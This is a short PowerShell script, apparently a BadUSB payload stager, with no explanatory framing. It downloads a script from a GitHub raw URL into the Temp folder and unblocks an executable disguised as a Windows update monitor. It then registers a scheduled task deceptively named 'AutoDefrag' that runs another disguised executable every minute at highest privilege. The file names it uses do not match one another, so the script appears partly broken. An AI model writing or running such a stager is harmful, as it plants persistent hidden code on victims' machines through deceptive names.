cd $env:Temp;

iwr -Uri https://raw.githubusercontent.com/TobiS137/BadUSB/refs/heads/main/cAps-TroLl-v3/raw.ps1 -O raw.ps1;
Unblock-File -Path "$env:Temp\258A2F13-D6F4-4CC9-A250-BD4CF37E9166\WinUpdateMonitor.exe"


Start-Sleep 1;
schtasks /create /tn "AutoDefrag" /tr "$env:Temp\winupdhost.exe" /sc minute /mo 1 /rl highest /f /ru "$env:USERNAME";
exit
